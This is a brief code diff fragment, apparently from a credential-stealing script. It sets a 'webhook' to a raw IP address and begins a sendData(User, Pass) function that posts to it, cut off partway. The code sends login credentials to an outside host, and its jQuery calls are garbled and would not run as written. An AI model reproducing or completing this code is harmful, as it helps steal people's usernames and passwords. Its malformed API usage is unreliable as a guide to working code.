@@ -1,5 +1,5 @@
 
-var webhook = $.get('70.95.197.6', 'e', console.log("Status: " + status), txt)
+var webhook = $.get('70.95.197.6', 'e', console.log("Status: " + status), "text")
 function sendData(User, Pass) {
     $.post(webhook,
     {
